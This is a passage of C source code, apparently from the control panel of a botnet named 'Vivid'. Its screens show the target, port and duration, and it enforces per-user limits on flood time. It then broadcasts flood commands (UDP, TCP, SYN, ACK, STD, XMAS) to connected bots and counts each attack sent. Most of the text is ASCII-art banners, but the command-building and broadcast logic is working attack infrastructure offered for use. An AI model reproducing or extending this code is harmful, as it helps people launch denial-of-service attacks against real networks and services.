\t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 6){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⡟⠘⣿⠟⣉⡴⡋⢨⢻⡿⠃⣽⣿⡿⢟⡫⢀⢸⣿⣿⠋⢰⣦⣶⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣟⣵⢆⠐⣭⠩⡚⠁⣼⣈⠅⢀⡽⠑⠛⢁⠴⠩⡚⣭⠅⡇⠘⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡿⣣⣿⡇⢟⣖⠇⣶⣙⣿⠰⣻⠲⢃⣦⣿⣇⠟⣱⣃⠾⢃⣠⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 7){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⠿⣿⣿⣿⣿⢟⡍⣿⣿⣿⡿⠿⠿⢿⣿⣿⡿⠿⣿⠿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣼⡈⢻⣿⡇⠏⢠⣿⡿⡁⠀⣿⣧⣬⡟⢁⣤⣛⣛⣥⣾⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣟⣾⡇⢸⡟⠁⡠⢛⣛⢣⡇⠀⣿⣿⠿⠂⢈⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡇⠘⢠⣾⢰⡿⠯⣣⣿⠀⢸⠁⣠⣾⠿⠿⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣧⡀⣿⣿⡮⡣⠾⠶⠂⣠⡎⠀⢭⣶⠿⣋⣼⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 8){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠿⠛⣩⣵⢌⣿⣿⠃⢙⢿⣿⣿⠸⠿⠿⠛⣩⣶⢌⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡾⠋⣠⣬⣭⣷⡿⣫⡶⠁⣸⢸⡿⠃⡸⠋⣠⣬⣭⣶⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⠁⣰⣿⡿⠟⠋⠾⡙⠁⣰⣿⢸⠁⡐⠀⣼⣿⠿⠛⢻⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⠀⢟⣵⡾⢋⣆⢾⡆⣰⣹⣿⠀⣸⣇⠀⢋⣵⡿⣫⣾⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣟⣛⣤⣤⣥⣾⣿⣿⣦⣅⣿⣿⣿⣦⣟⣫⣤⣤⣵⣾⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            if(atoi(mysecs) > ACCS[fnd].vivscs){
                sprintf(vivid, "\r\n              "R"[Attack Not Sent!"R"] "R"[Exceeded Your Max Flood Time...]\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sleep(3);
                memset(mytarg, 0, sizeof(mytarg));
                memset(myport, 0, sizeof(myport));
                memset(mysecs, 0, sizeof(mysecs));
                goto startflood;
            }
            Trim(ftype);
            char atkcmd [300];
            sprintf(atkcmd, ". %s %s %s %s", ftype, mytarg, myport, mysecs);
            Trim(atkcmd);
            Broadcast(atkcmd, vivfd, usrnms, 0, vivfd);
            //Attack Sent
            if(atk_wtng == 1){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⡿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠿⣿⠿⠿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⠃⢸⣿⣿⡇⠈⣿⠿⣛⠅⢈⣴⣶⡄⠙⣿⣿⡿⣋⠀⣱⣶⡆⢹"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣧⣨⠅⠀⣼⠿⡟⠀⠄⣵⣾⠏⠀⣜⣛⣽⡇⢀⢛⡵⢪⠁⢀⡬⠟⢀⣾"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡏⢀⣼⣯⠊⠀⢈⣶⡬⡊⠀⣾⣿⣿⡟⢁⣆⠛⣩⠀⢠⣭⣵⣶⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⡇⢼⡿⢫⠀⣼⣿⣿⡜⠀⣦⡵⠖⣂⣤⣿⣽⡹⢿⢠⣷⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣶⣾⣿⣷⣶⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                UDPS++;
            } else if(atk_wtng == 2){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⠛⢛⣿⠿⢿⣿⣿⣿⢿⡿⢿⣿⣿⡿⣿⠿⢿⣿⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⣛⣛⣣⣾⡟⢀⣢⡤⢀⣴⣞⣣⠿⣫⠀⣵⣷⠈⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡿⣫⡍⢀⢺⠋⣰⣿⡿⠟⡵⠏⠂⠰⣝⣡⣾⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣇⢿⢀⣾⣿⠀⢫⡷⢟⣥⢶⡇⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣷⣾⣿⣽⣶⣶⣾⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                TCPS++;
            } else if(atk_wtng == 3){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⢉⣭⢉⡌⢹⣿⣿⠙⣿⣿⡿⠉⢻⣿⣿⠙⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠏⡆⠈⣿⠏⢠⣾⣿⠏⢠⢟⣭⠎⢀⠎⣿⠃⢰⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡏⡴⠿⢄⣷⠀⠋⢰⡿⠟⠁⡠⡇⠣⠁⠀⣾⢸⠃⣰⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⡷⢜⠰⠷⠂⣠⡕⣢⡌⢀⣶⣾⣧⡻⢠⣧⣿⣎⢰⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                SYNS++;
            } else if(atk_wtng == 4){ //ACK
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠿⡛⠁⡌⣟⣛⠛⠩⠶⣢⡿⢟⠈⡿⠋⣴⣶⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡟⠕⠾⠋⣠⡺⡱⡞⢁⣾⣿⣿⠩⠊⠃⠘⣡⣾⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⢟⣡⠀⡠⡶⢮⢡⡺⠀⠞⣫⡶⣠⢡⠂⣤⣷⡈⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣦⣛⣼⣿⣿⣿⣬⣘⣥⣬⣵⣾⣿⣮⣤⣿⣿⣷⡘⢿⡟⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                ACKS++;
            } else if(atk_wtng == 5){ //STD
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⡐⢨⣭⡋⢛⢛⢛⡛⠙⠿⢛⠛⠻⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡧⡁⠀⣭⣤⣾⡟⠀⣸⢟⣩⡔⠀⢼⡟⣷⠀⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⢫⣴⠁⣿⠀⠹⢫⡭⠁⡐⣏⠺⡛⠀⣴⣶⣶⡟⢀⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⢸⢁⣑⡛⠀⠀⣿⡇⣰⣟⣿⢡⠀⠀⣛⡛⠛⠠⢾⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣯⣥⣭⣉⣥⣶⣵⣮⣥⣿⣿⣿⣷⣄⣭⣭⣴⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                STDS++;
            } else if(atk_wtng == 6){ //XMAS
